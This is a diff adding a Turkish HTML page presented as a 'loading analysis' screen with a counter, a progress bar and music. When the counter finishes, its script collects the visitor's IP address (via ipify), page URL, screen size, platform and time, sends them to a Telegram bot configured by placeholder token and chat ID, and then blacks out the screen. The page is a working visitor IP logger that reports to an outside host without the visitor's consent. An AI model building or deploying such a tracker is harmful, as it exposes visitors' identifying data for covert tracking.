@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yükleniyor Analizi</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            transition: background 1s ease;
+        }
+        body.black-screen {
+            background: #000000 !important;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 500px;
+            transition: opacity 1s ease;
+            position: relative;
+            z-index: 2;
+        }
+        body.black-screen .container {
+            opacity: 0;
+            visibility: hidden;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .counter {
+            font-size: 4em;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .health-bar-container {
+            width: 100%;
+            height: 30px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            margin: 20px 0;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        .health-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #4cd964, #5ac8fa);
+            transition: width 0.1s linear;
+            border-radius: 15px;
+            box-shadow: 0 0 20px #4cd964;
+        }
+        .status {
+            font-size: 1.2em;
+            margin-top: 20px;
+            opacity: 0.9;
+        }
+        .file-info {
+            font-size: 0.9em;
+            margin-top: 15px;
+            padding: 8px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            color: #ffd700;
+        }
+        .warning {
+            font-size: 0.8em;
+            margin-top: 30px;
+            opacity: 0.6;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- ÇOKLU SES KAYNAKLARI - TÜM FORMATLARI DENER -->
+    <audio id="bg-audio" loop preload="auto">
+        <!-- MP3 olarak dene -->
+        <source src="video1.mp3" type="audio/mpeg">
+        <!-- MP4 olarak dene (belki video1.mp4) -->
+        <source src="video1.mp4" type="audio/mp4">
+        <!-- WAV olarak dene -->
+        <source src="video1.wav" type="audio/wav">
+        <!-- OGG olarak dene -->
+        <source src="video1.ogg" type="audio/ogg">
+        <!-- M4A olarak dene -->
+        <source src="video1.m4a" type="audio/mp4">
+        <!-- EL CLASSICO - online yedek -->
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="container">
+        <h1>🔍 Yükleniyor Analizi</h1>
+        <div class="counter" id="counter">0</div>
+        <div class="health-bar-container">
+            <div class="health-bar" id="healthBar"></div>
+        </div>
+        <div class="status" id="status">Sistem başlatılıyor...</div>
+        <div class="file-info" id="fileStatus">📁 Dosya kontrol ediliyor: video1.mp3</div>
+        <div class="warning">
+            ⚠️ Sayaç 100 olunca siyah ekran ve müzik
+        </div>
+    </div>
+
+    <script>
+        let count = 0;
+        const counterElement = document.getElementById('counter');
+        const healthBarElement = document.getElementById('healthBar');
+        const statusElement = document.getElementById('status');
+        const fileStatusElement = document.getElementById('fileStatus');
+        const audio = document.getElementById('bg-audio');
+        const body = document.body;
+        
+        // KENDİ TELEGRAM BİLGİLERİNİZ
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        // DOSYA KONTROL FONKSİYONU
+        async function checkFileExists() {
+            const filesToCheck = [
+                'video1.mp3',
+                'video1.mp4',
+                'video1.wav',
+                'video1.ogg',
+                'video1.m4a'
+            ];
+            
+            fileStatusElement.innerHTML = '🔍 Dosya aranıyor...';
+            
+            for (const file of filesToCheck) {
+                try {
+                    const response = await fetch(file, { method: 'HEAD' });
+                    if (response.ok) {
+                        fileStatusElement.innerHTML = `✅ Dosya bulundu: ${file}`;
+                        console.log('✅ Dosya bulundu:', file);
+                        return true;
+                    }
+                } catch (e) {
+                    // sessiz geç
+                }
+            }
+            
+            fileStatusElement.innerHTML = '⚠️ video1.mp3 bulunamadı, online müzik kullanılacak';
+            return false;
+        }
+
+        // SES BAŞLATMA
+        function playAudio() {
+            audio.volume = 0.8;
+            
+            const playPromise = audio.play();
+            
+            if (playPromise !== undefined) {
+                playPromise.then(() => {
+                    console.log('✅ Ses başladı');
+                    fileStatusElement.innerHTML = '🔊 Ses aktif';
+                }).catch(error => {
+                    console.log('❌ Ses başlamadı, tıklama bekleniyor');
+                    fileStatusElement.innerHTML = '👆 Sesi başlatmak için tıklayın';
+                    
+                    document.body.addEventListener('click', function clickHandler() {
+                        audio.play();
+                        fileStatusElement.innerHTML = '🔊 Ses aktif (tıklama ile)';
+                        document.body.removeEventListener('click', clickHandler);
+                    }, { once: true });
+                });
+            }
+        }
+
+        // TELEGRAM BİLGİLERİ
+        async function getInfo() {
+            const info = {
+                zaman: new Date().toLocaleString('tr-TR'),
+                sayfa: window.location.href,
+                ekran: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform
+            };
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ip = ipData.ip;
+            } catch (error) {
+                info.ip = 'IP alınamadı';
+            }
+
+            return info;
+        }
+
+        async function sendToTelegram(info) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.log('Test modu:', info);
+                fileStatusElement.innerHTML = `📊 Test: ${info.ip}`;
+                return;
+            }
+
+            const message = `🔔 YENİ ZİYARETÇİ
+IP: ${info.ip}
+Cihaz: ${info.platform}
+Ekran: ${info.ekran}
+Zaman: ${info.zaman}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: message})
+                });
+                fileStatusElement.innerHTML = '✅ Telegram gönderildi';
+            } catch (error) {
+                console.log('Telegram hatası:', error);
+            }
+        }
+
+        // SİYAH EKRAN
+        function activateBlackScreen() {
+            body.classList.add('black-screen');
+            fileStatusElement.innerHTML = '⬛ SİYAH EKRAN - Ses devam ediyor';
+        }
+
+        // SAYAÇ
+        function startCounter() {
+            const interval = setInterval(async () => {
+                count++;
+                counterElement.textContent = count;
+                healthBarElement.style.width = count + '%';
+                
+                if (count === 30) statusElement.textContent = 'IP tespit ediliyor...';
+                if (count === 60) statusElement.textContent = 'Cihaz bilgileri toplanıyor...';
+                if (count === 90) statusElement.textContent = 'Son hazırlıklar...';
+
+                if (count === 100) {
+                    clearInterval(interval);
+                    statusElement.textContent = '✅ Tamamlandı!';
+                    
+                    const info = await getInfo();
+                    await sendToTelegram(info);
+                    
+                    setTimeout(() => {
+                        activateBlackScreen();
+                    }, 1500);
+                }
+            }, 60);
+        }
+
+        // BAŞLAT
+        window.addEventListener('load', async () => {
+            // Önce dosya var mı kontrol et
+            await checkFileExists();
+            
+            // Ses başlatma dene
+            setTimeout(() => {
+                playAudio();
+            }, 1000);
+            
+            // Sayaç başlat
+            setTimeout(() => {
+                startCounter();
+                statusElement.textContent = 'Analiz ediliyor...';
+            }, 1500);
+        });
+
+        // Hata yakalama
+        audio.addEventListener('error', (e) => {
+            console.log('Ses dosyası hatası:', e);
+            fileStatusElement.innerHTML = '⚠️ Ses dosyası okunamadı, online yedeğe geçildi';
+        });
+    </script>
+</body>
+</html>
